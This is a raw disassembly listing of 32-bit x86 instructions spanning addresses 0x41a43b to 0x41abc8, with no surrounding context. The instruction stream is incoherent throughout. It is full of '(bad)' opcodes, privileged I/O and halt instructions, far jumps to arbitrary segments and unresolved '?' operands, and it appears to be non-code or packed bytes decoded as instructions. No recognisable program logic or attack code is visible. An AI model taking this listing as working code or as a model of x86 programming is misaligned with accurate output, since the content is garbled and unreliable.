  41a43b:	pop    ebx
  41a43c:	test   eax,0xddaf1739
  41a441:	dec    ebx
  41a442:	lock jmp 0x5d15:0xc36ebb35
  41a44a:	in     eax,0x6c
  41a44c:	ja     0x41a4a2
  41a44e:	push   0x8ded822d
  41a453:	aaa    
  41a454:	dec    esi
  41a455:	and    DWORD PTR [ebx+esi*8+0x5f],esi
  41a459:	adc    DWORD PTR [ecx],0x2169ce9a
  41a45f:	xchg   esp,eax
  41a460:	and    eax,0x8438077c
  41a465:	or     bl,BYTE PTR [ecx-0x17c10121]
  41a46b:	test   BYTE PTR [ebp+0x36],bh
  41a46e:	ret    0xcac4
  41a471:	adc    al,0xad
  41a473:	jmp    0x8af:0x785dfe11
  41a47a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a47b:	mov    al,ds:0xe2c0946
  41a480:	adc    ecx,ecx
  41a482:	fist   DWORD PTR [esi+0x4b]
  41a485:	sub    eax,ebp
  41a487:	add    eax,0xc020748a
  41a48c:	mov    edi,0xdd35a28c
  41a491:	jnp    0x41a4a3
  41a493:	pop    ds
  41a494:	scas   eax,DWORD PTR es:[edi]
  41a495:	mov    DWORD PTR [edi],eax
  41a497:	xchg   BYTE PTR [edi],bl
  41a499:	adc    eax,0x60c7823c
  41a49e:	js     0x41a4cd
  41a4a0:	or     edx,DWORD PTR [esi]
  41a4a2:	jp     0x41a430
  41a4a4:	in     eax,0x99
  41a4a6:	mov    edx,0x37f93544
  41a4ab:	xchg   ecx,eax
  41a4ac:	cmp    edx,DWORD PTR [edx-0x24]
  41a4af:	inc    ecx
  41a4b0:	sbb    edx,DWORD PTR [ebx+ebx*2]
  41a4b3:	mov    esp,0xe8ccedcf
  41a4b8:	xchg   ebx,eax
  41a4b9:	lods   eax,DWORD PTR ds:[esi]
  41a4ba:	jae    0x41a498
  41a4bc:	cmp    DWORD PTR fs:[edi+0x498c113f],0xa22510de
  41a4c7:	sbb    edx,DWORD PTR [ebx-0x37]
  41a4ca:	xchg   eax,edi
  41a4cc:	push   ds
  41a4cd:	mov    ds:0x88f15be4,eax
  41a4d2:	xchg   ebx,eax
  41a4d3:	jmp    FWORD PTR [ebp-0x72ec5e5]
  41a4d9:	or     DWORD PTR [eax+0x7d62e23c],ebp
  41a4df:	cmp    eax,0x25bf4f99
  41a4e4:	mov    DWORD PTR [eax+0x300fdb1d],0x50549f2b
  41a4ee:	loopne 0x41a47e
  41a4f0:	sbb    al,0x9e
  41a4f2:	lds    ecx,FWORD PTR [edi]
  41a4f4:	jge    0x41a512
  41a4f6:	mov    edx,0x81b25a0d
  41a4fb:	icebp  
  41a4fc:	ret    
  41a4fd:	add    eax,0x7f3f6474
  41a502:	xchg   ecx,eax
  41a503:	and    BYTE PTR [ecx+ebp*1+0x2e],0x1e
  41a508:	mov    ch,0x3f
  41a50a:	mov    edi,0xad305cfa
  41a50f:	iret   
  41a510:	mov    dh,0xe8
  41a512:	sbb    esi,DWORD PTR [esi-0x18242329]
  41a518:	rcl    DWORD PTR [esi+0x23],0xe5
  41a51c:	aaa    
  41a51d:	inc    ebx
  41a51e:	pusha  
  41a51f:	stos   DWORD PTR es:[edi],eax
  41a520:	test   eax,0x3944c17d
  41a525:	inc    edx
  41a526:	out    dx,eax
  41a527:	xchg   ebp,eax
  41a528:	test   eax,0xd2fd50e0
  41a52d:	sbb    eax,0x765a5d65
  41a532:	pop    ebx
  41a533:	retf   0x9170
  41a536:	pop    esi
  41a537:	and    BYTE PTR [esp+esi*4-0x4fe72b0e],0x7e
  41a53f:	repz fisubr DWORD PTR [ebx-0x56]
  41a543:	and    al,0x72
  41a545:	jecxz  0x41a573
  41a547:	mov    eax,ds:0xd0c8616f
  41a54c:	jb     0x41a506
  41a54e:	pop    esi
  41a54f:	cs scas eax,DWORD PTR es:[edi]
  41a551:	(bad)  
  41a552:	mov    al,ds:0xf41368be
  41a557:	(bad)  
  41a558:	aam    0xd5
  41a55a:	lahf   
  41a55b:	out    0xdc,al
  41a55d:	mov    eax,ds:0xae6aec4f
  41a562:	repz mov edi,DWORD PTR [esi-0x4b573099]
  41a569:	(bad)  
  41a56a:	sub    DWORD PTR [edx],esi
  41a56c:	test   al,0x7b
  41a56e:	sbb    eax,0xe4f58c27
  41a573:	jl     0x41a5ca
  41a575:	call   0xa27f:0x817bf677
  41a57c:	mov    es,WORD PTR [edi-0x698256e6]
  41a582:	popa   
  41a583:	sbb    al,0xfa
  41a585:	and    esp,ecx
  41a587:	xchg   esp,eax
  41a588:	imul   eax,DWORD PTR [eax+0x3932c230],0xa9be805d
  41a592:	clc    
  41a593:	stos   BYTE PTR es:[edi],al
  41a594:	daa    
  41a595:	int3   
  41a596:	sub    ebx,DWORD PTR [ecx-0x7e]
  41a599:	dec    esi
  41a59a:	mov    ah,0xa6
  41a59c:	push   ss
  41a59d:	aad    0xec
  41a59f:	sub    BYTE PTR [bx+0x4],bl
  41a5a3:	sub    eax,0xd5449502
  41a5a8:	out    dx,al
  41a5a9:	mov    al,dh
  41a5ab:	(bad)  
  41a5ac:	in     al,0x97
  41a5ae:	sbb    eax,0xe64c0031
  41a5b3:	pusha  
  41a5b4:	and    al,0x17
  41a5b6:	popa   
  41a5b7:	adc    al,0xc1
  41a5b9:	inc    esi
  41a5ba:	xor    al,BYTE PTR [ebp+0x70]
  41a5bd:	and    edi,eax
  41a5bf:	sub    dh,BYTE PTR [edx]
  41a5c1:	push   ebx
  41a5c2:	pop    ds
  41a5c3:	dec    edx
  41a5c4:	mov    esp,0x2a418ca8
  41a5c9:	sar    DWORD PTR [esp+ebp*4-0x7a03bef3],0xb5
  41a5d1:	sub    edx,eax
  41a5d3:	pusha  
  41a5d4:	stos   BYTE PTR es:[edi],al
  41a5d5:	mov    bl,0x9e
  41a5d7:	push   edi
  41a5d8:	sbb    cl,BYTE PTR ds:[edi+ebx*4]
  41a5dc:	outs   dx,DWORD PTR ds:[esi]
  41a5dd:	ins    DWORD PTR es:[edi],dx
  41a5de:	xchg   edi,eax
  41a5df:	mov    eax,ds:0x1e2c7430
  41a5e4:	loopne 0x41a59a
  41a5e6:	in     eax,0x1b
  41a5e8:	dec    esp
  41a5e9:	shr    DWORD PTR [ebx],0xa9
  41a5ec:	cld    
  41a5ed:	dec    edx
  41a5ee:	mov    cl,0x81
  41a5f0:	adc    al,0x4d
  41a5f2:	sti    
  41a5f3:	out    dx,al
  41a5f4:	nop
  41a5f5:	out    0xd,al
  41a5f7:	mov    al,ds:0xa4018cad
  41a5fc:	mov    eax,ds:0xa096270
  41a601:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a602:	cmp    al,0xd
  41a604:	(bad)  
  41a605:	xor    BYTE PTR [esi+eiz*1-0x5a092f5b],0xb0
  41a60d:	and    BYTE PTR [ebx+edx*8],0xea
  41a611:	jb     0x41a5be
  41a613:	int3   
  41a614:	cmp    BYTE PTR [edx+0x426b0e41],ch
  41a61a:	loop   0x41a61c
  41a61c:	in     al,0x24
  41a61e:	add    ch,bh
  41a620:	dec    esp
  41a621:	fs mov edx,0xcef280d3
  41a627:	push   es
  41a628:	push   ebp
  41a629:	sub    DWORD PTR [eax+ebx*1+0x46],ecx
  41a62d:	ds out 0x81,eax
  41a630:	dec    esi
  41a631:	shl    BYTE PTR [edi+eax*8-0x54],cl
  41a635:	fdiv   QWORD PTR [edx+0x2d]
  41a638:	not    BYTE PTR [eax]
  41a63a:	xor    al,0xa
  41a63c:	add    DWORD PTR [esi],ecx
  41a63e:	dec    esi
  41a63f:	jl     0x41a677
  41a641:	mov    ah,0x5c
  41a643:	out    dx,eax
  41a644:	xor    BYTE PTR [edi-0x23],al
  41a647:	xor    bl,bh
  41a649:	int3   
  41a64a:	ja     0x41a5cc
  41a64c:	mov    ecx,0xd02dcfb7
  41a651:	or     BYTE PTR ds:0xe2bc2080,bh
  41a657:	sahf   
  41a658:	fwait
  41a659:	xor    DWORD PTR [edi+eiz*8+0x69],eax
  41a65d:	retw   0x2809
  41a661:	sub    BYTE PTR [esi-0x3ddd750c],al
  41a667:	push   cs
  41a668:	push   esi
  41a669:	pop    ds
  41a66a:	(bad)  
  41a66b:	(bad)  [edi-0x74]
  41a66e:	stos   DWORD PTR es:[edi],eax
  41a66f:	mov    eax,ds:0xc208b387
  41a674:	jecxz  0x41a621
  41a676:	inc    ebx
  41a677:	ficomp DWORD PTR [esi+eiz*2+0x1e]
  41a67b:	ins    DWORD PTR es:[edi],dx
  41a67c:	out    dx,al
  41a67d:	xchg   esi,eax
  41a67e:	xor    al,0xf4
  41a680:	inc    edi
  41a681:	mov    bl,0xec
  41a683:	adc    ebx,DWORD PTR [ecx+0x4bd36f6c]
  41a689:	test   eax,0xdeb192f9
  41a68e:	fisub  WORD PTR [edi+0x0]
  41a691:	mov    ss,WORD PTR [edi-0x4]
  41a694:	mov    al,ds:0x23019fb8
  41a699:	sub    eax,0x2a12bc49
  41a69e:	mov    bl,BYTE PTR [esp+ebp*8+0x53]
  41a6a2:	mov    esi,0xb0411e1a
  41a6a7:	dec    eax
  41a6a8:	mov    si,0xeddc
  41a6ac:	pusha  
  41a6ad:	shl    BYTE PTR [ebx+0xbcd5abb],1
  41a6b3:	add    al,0x8
  41a6b5:	add    DWORD PTR [ebx],ebp
  41a6b7:	outs   dx,DWORD PTR ds:[esi]
  41a6b8:	and    esi,ecx
  41a6ba:	vfmadd132ss xmm0,xmm1,DWORD PTR [edx+0x54]
  41a6c0:	inc    edx
  41a6c1:	dec    edi
  41a6c2:	cmp    BYTE PTR [ecx-0x2f],0x31
  41a6c6:	jb     0x41a6ab
  41a6c8:	out    dx,al
  41a6c9:	(bad)  
  41a6ca:	and    eax,0xe5b49a22
  41a6cf:	data16 jae 0x41a69f
  41a6d2:	and    BYTE PTR [edx],bl
  41a6d4:	in     eax,0xb1
  41a6d6:	or     BYTE PTR [eax],0xb
  41a6d9:	mov    ebp,0xf9b6db72
  41a6de:	jmp    0x41a675
  41a6e0:	gs gs clc 
  41a6e3:	enter  0xa8e1,0x6b
  41a6e7:	jbe    0x41a724
  41a6e9:	aaa    
  41a6ea:	int3   
  41a6eb:	mov    ds:0xc6d6b22c,eax
  41a6f0:	adc    edx,edx
  41a6f2:	add    ebp,edx
  41a6f4:	ret    0x903c
  41a6f7:	jecxz  0x41a73f
  41a6f9:	rcr    DWORD PTR [ebx+0x17],1
  41a6fc:	pop    edx
  41a6fd:	lahf   
  41a6fe:	mov    eax,0xd9c2c97
  41a703:	add    ah,BYTE PTR [ebx+0x59990353]
  41a709:	in     al,dx
  41a70a:	out    dx,eax
  41a70b:	dec    edx
  41a70c:	(bad)  
  41a70d:	je     0x41a6ef
  41a70f:	dec    ebp
  41a710:	mov    bh,BYTE PTR [esi+edx*8-0x3298d0df]
  41a717:	pusha  
  41a718:	add    al,0x1a
  41a71a:	mov    al,ds:0x2045abf7
  41a71f:	xchg   di,ax
  41a721:	mov    al,0x20
  41a723:	add    eax,0xfdee81ed
  41a728:	pop    esi
  41a729:	mov    esp,db7
  41a72c:	or     DWORD PTR [ecx-0x6e103ed7],0xc3bc5902
  41a736:	(bad)  
  41a737:	mov    esi,0x29cdfcfb
  41a73c:	fild   QWORD PTR [edx]
  41a73e:	mov    bl,0xa3
  41a740:	mov    ch,dh
  41a742:	jno    0x41a71d
  41a744:	xor    ah,BYTE PTR [esi-0x28786e1b]
  41a74a:	fcmovnu st,st(7)
  41a74c:	ss loope 0x41a722
  41a74f:	dec    ebx
  41a750:	lods   eax,DWORD PTR ds:[esi]
  41a751:	stos   DWORD PTR es:[edi],eax
  41a752:	sub    esp,0x4979561f
  41a758:	mov    cl,0xfb
  41a75a:	es pop ss
  41a75c:	push   eax
  41a75d:	jge    0x41a7d8
  41a75f:	div    DWORD PTR [esi+eiz*4-0x10]
  41a763:	jmp    0x41a7d9
  41a765:	lods   al,BYTE PTR ds:[esi]
  41a766:	imul   eax,esi,0x692bd0a1
  41a76c:	test   BYTE PTR [ebx],al
  41a76e:	stos   BYTE PTR es:[edi],al
  41a76f:	ja     0x41a7e0
  41a771:	xor    ch,dh
  41a773:	into   
  41a774:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  41a776:	outs   dx,BYTE PTR ds:[esi]
  41a777:	pop    ss
  41a778:	xor    ebx,DWORD PTR [ebp-0x53]
  41a77b:	or     ebx,edi
  41a77d:	push   ebx
  41a77e:	imul   eax,ecx,0xffffffec
  41a781:	cmp    BYTE PTR [ebx],dh
  41a783:	mov    edx,0xe9b84b94
  41a788:	icebp  
  41a789:	pop    ss
  41a78a:	push   ss
  41a78b:	mov    ?,ebp
  41a78d:	daa    
  41a78e:	loop   0x41a74f
  41a790:	mov    ebx,ecx
  41a792:	jno    0x41a732
  41a794:	mov    ebp,0x5c51ebe5
  41a799:	push   esi
  41a79a:	mov    cl,0xea
  41a79c:	lods   al,BYTE PTR ds:[esi]
  41a79d:	lahf   
  41a79e:	push   ss
  41a79f:	cmp    esp,esi
  41a7a1:	and    eax,0x31c32ca1
  41a7a6:	jg     0x41a7db
  41a7a8:	loopne 0x41a80d
  41a7aa:	in     eax,dx
  41a7ab:	jns    0x41a7b9
  41a7ad:	test   cl,dh
  41a7af:	pop    ds
  41a7b0:	mov    ds:0xa6bdeccb,al
  41a7b5:	mov    bl,0xea
  41a7b7:	sub    eax,0x4878b1a1
  41a7bc:	jnp    0x41a825
  41a7be:	pop    ebp
  41a7bf:	mov    esi,0x52acf8af
  41a7c4:	push   0xffffffba
  41a7c6:	(bad)  
  41a7c8:	adc    ah,bh
  41a7ca:	pop    ecx
  41a7cb:	xchg   esp,eax
  41a7cc:	mov    dh,0xc7
  41a7ce:	out    dx,al
  41a7cf:	fnstsw WORD PTR [esi+0x150a5d2c]
  41a7d5:	ins    BYTE PTR es:[edi],dx
  41a7d6:	adc    al,0x22
  41a7d8:	push   ecx
  41a7d9:	test   eax,0xf896101a
  41a7de:	push   eax
  41a7df:	fmul   DWORD PTR [ecx+eiz*4-0x6a]
  41a7e3:	inc    esi
  41a7e4:	inc    esp
  41a7e5:	mov    esi,0x5ec78fc9
  41a7ea:	jbe    0x41a770
  41a7ec:	mov    dh,0xc
  41a7ee:	test   BYTE PTR [ecx-0x5746ced8],ah
  41a7f4:	push   ebx
  41a7f5:	sub    BYTE PTR [edx],bl
  41a7f7:	popf   
  41a7f8:	mov    esi,0xfe8e840d
  41a7fd:	fbld   TBYTE PTR [ebx+0x44]
  41a800:	call   0xa1d1bb5f
  41a805:	call   0x18cf:0x6bf0ac19
  41a80c:	test   eax,0x7fba4a92
  41a811:	mov    cl,0xc
  41a813:	inc    eax
  41a814:	jo     0x41a7b6
  41a816:	jecxz  0x41a7e5
  41a818:	inc    esi
  41a819:	imul   ebp,DWORD PTR [ebp+0x11],0xfacfe7d4
  41a820:	push   edx
  41a821:	(bad)  
  41a823:	iret   
  41a824:	mov    ds:0x72a93469,eax
  41a829:	ja     0x41a7f2
  41a82b:	aas    
  41a82c:	or     BYTE PTR [eax-0x6c528aa],cl
  41a832:	out    dx,al
  41a833:	shl    DWORD PTR ds:0x640afac8,1
  41a839:	xchg   DWORD PTR [esi-0x4a75df58],ebp
  41a83f:	cmp    eax,0x9a17d8ed
  41a844:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a846:	clc    
  41a847:	dec    ebx
  41a848:	jbe    0x41a8bd
  41a84a:	sub    DWORD PTR [esi+0x9],0x2c
  41a84e:	dec    di
  41a850:	ret    
  41a851:	sub    al,0x75
  41a853:	jo     0x41a7d5
  41a855:	push   0xb6114388
  41a85a:	xchg   ebp,eax
  41a85b:	arpl   WORD PTR [ebx+0x530356b6],sp
  41a861:	cld    
  41a862:	sbb    BYTE PTR [edi+0x71fb4472],al
  41a868:	(bad)  
  41a869:	in     eax,dx
  41a86a:	shl    DWORD PTR [eax-0x25],0x28
  41a86e:	(bad)  
  41a86f:	mul    ebx
  41a871:	js     0x41a8d5
  41a873:	sub    DWORD PTR [ebx-0x7f],eax
  41a876:	int    0x3
  41a878:	cmp    eax,0xf2bf6c22
  41a87d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a87e:	jmp    0x41a8e5
  41a880:	mov    ebp,DWORD PTR [ebp+0x1a]
  41a883:	push   cs
  41a884:	aad    0x43
  41a886:	xlat   BYTE PTR ds:[ebx]
  41a887:	fldenv [eax]
  41a889:	cmp    eax,0x1d587412
  41a88e:	shl    BYTE PTR [edi],0xa3
  41a891:	pushf  
  41a892:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a893:	mov    ds:0xa03fc2e8,eax
  41a898:	sub    ah,bh
  41a89a:	aas    
  41a89b:	jbe    0x41a8a2
  41a89d:	outs   dx,BYTE PTR ds:[esi]
  41a89e:	jg     0x41a8e7
  41a8a0:	adc    ah,cl
  41a8a2:	dec    edx
  41a8a3:	pop    ss
  41a8a4:	xchg   edi,eax
  41a8a5:	scas   al,BYTE PTR es:[edi]
  41a8a6:	mov    DWORD PTR [esi],ebx
  41a8a8:	add    eax,0xcf927469
  41a8ad:	cmp    DWORD PTR [edi+eiz*1-0x22],ecx
  41a8b1:	inc    edx
  41a8b2:	dec    eax
  41a8b3:	dec    esi
  41a8b4:	mov    ebx,ebp
  41a8b6:	pop    ebp
  41a8b7:	push   esp
  41a8b8:	mov    ecx,0xabf9ffce
  41a8bd:	retf   
  41a8be:	cmp    DWORD PTR [esp+ecx*1],edx
  41a8c1:	mov    ebx,0x2225b7fe
  41a8c6:	xor    DWORD PTR [edx-0xf],ebp
  41a8c9:	jg     0x41a85b
  41a8cb:	(bad)  
  41a8cc:	jne    0x41a900
  41a8ce:	cli    
  41a8cf:	imul   eax,DWORD PTR [edx-0x5],0x4280d49
  41a8d6:	cld    
  41a8d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a8d8:	fstp   DWORD PTR [esi+0x1c23e597]
  41a8de:	sub    eax,0x94d68944
  41a8e3:	sub    esi,edx
  41a8e5:	or     eax,0x1dc9ff4a
  41a8ea:	xchg   ebx,eax
  41a8eb:	mov    eax,0x9c380f69
  41a8f0:	adc    dl,BYTE PTR [eax]
  41a8f2:	retf   0x4668
  41a8f5:	std    
  41a8f6:	mov    BYTE PTR [ebx-0x423e836b],cl
  41a8fc:	mov    cl,0x8e
  41a8fe:	popf   
  41a8ff:	rol    DWORD PTR [eax],0xc6
  41a902:	cmp    bh,BYTE PTR [ebx*1+0x7aa154ea]
  41a909:	test   BYTE PTR [ebp+0x4b6b45cf],bh
  41a90f:	dec    edi
  41a910:	pop    esp
  41a911:	ja     0x41a8cd
  41a913:	sub    esp,DWORD PTR [ecx]
  41a915:	popa   
  41a916:	push   0xffffffe2
  41a918:	xchg   DWORD PTR [edi+0x78],edi
  41a91b:	das    
  41a91c:	sub    eax,0x4241e9ff
  41a921:	jg     0x41a930
  41a923:	cmc    
  41a924:	cmp    BYTE PTR [esi],al
  41a926:	dec    ebx
  41a927:	in     al,dx
  41a928:	add    ebp,eax
  41a92a:	xor    ah,BYTE PTR [ebx-0x286b8614]
  41a930:	sub    bl,BYTE PTR [ecx-0x1d]
  41a933:	mov    esp,0x900e02bb
  41a938:	xor    al,0xd0
  41a93a:	aam    0x16
  41a93c:	mov    al,0xa4
  41a93e:	jae    0x41a8e5
  41a940:	xchg   BYTE PTR [eax],dl
  41a942:	add    al,0x6b
  41a944:	bound  ecx,QWORD PTR [edi+0x34]
  41a947:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a948:	add    al,0x52
  41a94a:	bound  ecx,QWORD PTR [esi+0x2fb6a57a]
  41a950:	pop    esp
  41a951:	jo     0x41a919
  41a953:	rcr    al,0x71
  41a956:	dec    esp
  41a957:	sbb    DWORD PTR [edx+0x29f4099e],ebx
  41a95d:	push   0xbbc4adfc
  41a962:	aad    0x28
  41a964:	jae    0x41a918
  41a966:	jmp    FWORD PTR [edi]
  41a968:	gs sbb eax,0x1ead9bd4
  41a96e:	mov    ebx,DWORD PTR [esi]
  41a970:	test   BYTE PTR [ebp+0x15],ah
  41a973:	(bad)  
  41a974:	fld    DWORD PTR [eax+esi*4-0x28]
  41a978:	mov    WORD PTR [ecx-0x7b5cf48f],ss
  41a97e:	mov    ds:0xeb5ce541,eax
  41a983:	jecxz  0x41a9e3
  41a985:	lock mov al,0x69
  41a988:	test   al,0x9
  41a98a:	popa   
  41a98b:	ds stos BYTE PTR es:[edi],al
  41a98d:	pop    edx
  41a98e:	ret    
  41a98f:	aaa    
  41a990:	retf   0x891a
  41a993:	push   cs
  41a994:	das    
  41a995:	xchg   BYTE PTR [eax-0x37],ch
  41a998:	mov    ch,0x5
  41a99a:	lock hlt 
  41a99c:	call   0xa2cf:0xd6412808
  41a9a3:	repnz cmp eax,ebp
  41a9a6:	pop    ds
  41a9a7:	idiv   BYTE PTR [ebx-0x2]
  41a9aa:	xchg   BYTE PTR [ebp-0x1a],cl
  41a9ad:	mov    dh,ch
  41a9af:	mov    ch,0x9c
  41a9b1:	inc    edx
  41a9b2:	jbe    0x41a9f3
  41a9b4:	inc    ebp
  41a9b5:	ficom  WORD PTR [edi]
  41a9b7:	rol    BYTE PTR [esi-0x22],0x9d
  41a9bb:	cld    
  41a9bc:	fsubr  st(2),st
  41a9be:	xchg   esi,eax
  41a9bf:	push   esp
  41a9c0:	fistp  QWORD PTR [edx-0x1dd7dc09]
  41a9c6:	and    DWORD PTR [ebx+edx*4-0x49],esp
  41a9ca:	fbstp  TBYTE PTR [ebp-0xf]
  41a9cd:	ins    DWORD PTR es:[edi],dx
  41a9ce:	call   0xa2ba:0xdce48888
  41a9d5:	test   al,0x4b
  41a9d7:	dec    edx
  41a9d8:	popa   
  41a9d9:	aas    
  41a9da:	cmc    
  41a9db:	inc    ebp
  41a9dc:	js     0x41a99e
  41a9de:	cmp    eax,0x81ecd3a7
  41a9e3:	add    al,0xf8
  41a9e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a9e6:	mov    al,ds:0x49655a43
  41a9eb:	mov    ch,0x13
  41a9ed:	fstp   TBYTE PTR [ecx+0x10]
  41a9f0:	test   DWORD PTR [edx-0x24],0xa57911e1
  41a9f7:	push   0xfffffffa
  41a9f9:	xor    eax,0xe08da4b3
  41a9fe:	cli    
  41a9ff:	(bad)  
  41aa00:	icebp  
  41aa01:	mov    ch,0x40
  41aa03:	adc    edi,esp
  41aa05:	mov    ?,WORD PTR [esi]
  41aa07:	jno    0x41aa59
  41aa09:	popf   
  41aa0a:	pop    ds
  41aa0b:	pop    es
  41aa0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aa0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa0e:	(bad)  
  41aa0f:	and    eax,0xdb48438
  41aa14:	mov    al,ds:0x97344e03
  41aa19:	les    ebp,FWORD PTR [esi]
  41aa1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa1c:	inc    ebx
  41aa1d:	xchg   esp,eax
  41aa1e:	push   es
  41aa1f:	jbe    0x41aa6f
  41aa21:	cmp    BYTE PTR [eax+esi*4-0x2b],al
  41aa25:	mov    esi,0x9a948921
  41aa2a:	ins    DWORD PTR es:[edi],dx
  41aa2b:	pop    ecx
  41aa2c:	jmp    0x7d867188
  41aa31:	mov    WORD PTR [edi],?
  41aa33:	add    eax,edi
  41aa35:	push   es
  41aa36:	bound  ebp,QWORD PTR [edx+0x4ead1297]
  41aa3c:	jne    0x41a9e6
  41aa3e:	retf   0x8446
  41aa41:	push   esi
  41aa42:	test   bl,ah
  41aa44:	std    
  41aa45:	adc    al,0xa
  41aa47:	mov    WORD PTR [edi-0x36d710ab],ds
  41aa4d:	pop    eax
  41aa4e:	xor    esp,DWORD PTR [edi-0x15]
  41aa51:	fbstp  TBYTE PTR [edx+ebp*8+0x7e]
  41aa55:	int3   
  41aa56:	or     DWORD PTR [eax+ebx*2],ecx
  41aa59:	mov    al,0xe9
  41aa5b:	ror    DWORD PTR [ecx-0x3896fc1],0xbf
  41aa62:	aas    
  41aa63:	arpl   WORD PTR [ebp+0x46],si
  41aa66:	xor    eax,0xfd7b0edc
  41aa6b:	fdivrp st(3),st
  41aa6d:	lods   al,BYTE PTR ds:[esi]
  41aa6e:	mov    al,ds:0x72ae1c84
  41aa73:	push   ss
  41aa74:	fsub   st(2),st
  41aa76:	outs   dx,DWORD PTR ds:[esi]
  41aa77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa78:	or     al,0xd6
  41aa7a:	adc    BYTE PTR [ecx],0x27
  41aa7d:	daa    
  41aa7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aa7f:	fs popf 
  41aa81:	xor    BYTE PTR [esi+edx*2+0x392c3c1b],ah
  41aa88:	mov    ebp,0xb73af5d
  41aa8d:	shl    DWORD PTR ds:0x97f1eb62,cl
  41aa93:	imul   ebp,DWORD PTR cs:[esi+0xc45deb9],0xedfe9ddd
  41aa9e:	(bad)  
  41aa9f:	call   0xc195f49e
  41aaa4:	ja     0x41aa59
  41aaa6:	xor    DWORD PTR [ebx-0x5],edi
  41aaa9:	dec    ebp
  41aaaa:	fisubr WORD PTR [edx+ecx*8]
  41aaad:	jbe    0x41aadb
  41aaaf:	sub    dl,al
  41aab1:	pop    edx
  41aab2:	xchg   edx,eax
  41aab3:	mov    edi,0xd077b700
  41aab8:	dec    eax
  41aab9:	mov    bh,0x9f
  41aabb:	addr16 or eax,0xaffc33e9
  41aac1:	push   esp
  41aac2:	mov    ds:0x447ab7ec,al
  41aac7:	jmp    0x8da69feb
  41aacc:	jmp    esi
  41aace:	and    DWORD PTR [edi],edi
  41aad0:	icebp  
  41aad1:	jbe    0x41aad1
  41aad3:	cmp    eax,0xd4f17c84
  41aad8:	jmp    0x7f745f6b
  41aadd:	adc    al,0x62
  41aadf:	lds    esi,FWORD PTR [edi-0x4e5c2f57]
  41aae5:	pushf  
  41aae6:	push   edi
  41aae7:	in     al,0xba
  41aae9:	hlt    
  41aaea:	js     0x41ab5a
  41aaec:	inc    edx
  41aaed:	stos   BYTE PTR es:[edi],al
  41aaee:	cmp    DWORD PTR [esi-0x26],esi
  41aaf1:	and    dl,BYTE PTR [ecx]
  41aaf3:	dec    ebp
  41aaf4:	je     0x41ab13
  41aaf6:	fwait
  41aaf7:	dec    ebx
  41aaf8:	and    DWORD PTR [esi-0x2f3f8ce],eax
  41aafe:	or     bh,BYTE PTR [edi-0xb]
  41ab01:	xlat   BYTE PTR ds:[ebx]
  41ab02:	inc    edi
  41ab03:	or     BYTE PTR [esi+0x89b25c6],bl
  41ab09:	cmp    al,0xa6
  41ab0b:	push   edx
  41ab0c:	push   ss
  41ab0d:	push   ss
  41ab0e:	pop    ebp
  41ab0f:	nop
  41ab10:	(bad)  
  41ab12:	enter  0x9937,0x77
  41ab16:	adc    ah,BYTE PTR [eax]
  41ab18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ab19:	inc    eax
  41ab1a:	add    BYTE PTR [esi+ecx*8],dh
  41ab1d:	jmp    0x4142:0xc69400a7
  41ab24:	and    al,0xbf
  41ab26:	movq   QWORD PTR [edi],mm5
  41ab29:	push   es
  41ab2a:	test   eax,0x616f9b60
  41ab2f:	push   ss
  41ab30:	ret    
  41ab31:	xchg   ebp,eax
  41ab32:	inc    edx
  41ab33:	gs (bad) 
  41ab35:	and    esp,ebp
  41ab37:	mov    eax,fs:0xd1f251ff
  41ab3d:	sti    
  41ab3e:	les    edx,FWORD PTR [ecx]
  41ab40:	push   esi
  41ab41:	loope  0x41aba7
  41ab43:	mov    ebp,0x68d6d75b
  41ab48:	ins    BYTE PTR es:[edi],dx
  41ab49:	inc    eax
  41ab4a:	pusha  
  41ab4b:	shl    BYTE PTR [ebp+ecx*2+0x23],0x80
  41ab50:	stc    
  41ab51:	jo     0x41aae4
  41ab53:	adc    al,0x1e
  41ab55:	add    cl,BYTE PTR [ebx+0x52]
  41ab58:	icebp  
  41ab59:	or     BYTE PTR [ecx+0x74],dh
  41ab5c:	mov    esp,0x16a310d2
  41ab61:	lock mov bh,0x6e
  41ab64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab65:	jnp    0x41ab45
  41ab67:	mov    esp,0x3df2ef3c
  41ab6c:	int    0x9a
  41ab6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ab6f:	scas   eax,DWORD PTR es:[edi]
  41ab70:	sub    al,0x41
  41ab72:	add    esp,ebp
  41ab74:	int    0x4
  41ab76:	and    ecx,esi
  41ab78:	mov    ah,0x57
  41ab7a:	push   esp
  41ab7b:	jecxz  0x41ab25
  41ab7d:	or     eax,0xefecce6b
  41ab82:	mov    WORD PTR [esi-0x5],ss
  41ab85:	xor    BYTE PTR [edi-0x2cef3d6],cl
  41ab8b:	test   al,0x1e
  41ab8d:	int    0xe2
  41ab8f:	adc    edx,eax
  41ab91:	inc    ecx
  41ab92:	or     ch,BYTE PTR [ebp-0x330507e2]
  41ab98:	jae    0x41abb7
  41ab9a:	add    eax,0xc0c678d4
  41ab9f:	cld    
  41aba0:	push   edi
  41aba1:	test   DWORD PTR [ebx+ebx*8+0x12],edi
  41aba5:	retf   
  41aba6:	call   0xb55f:0x7fea8900
  41abad:	add    ah,BYTE PTR [ecx+0x69]
  41abb0:	sbb    DWORD PTR [ecx-0x729cf253],esp
  41abb6:	(bad)  
  41abb7:	xchg   esi,eax
  41abb8:	shl    DWORD PTR [edx-0x2f6af76f],0x4f
  41abbf:	repnz shr BYTE PTR [eax],0x27
  41abc3:	sbb    eax,0xce3f96dd
  41abc8:	fwait
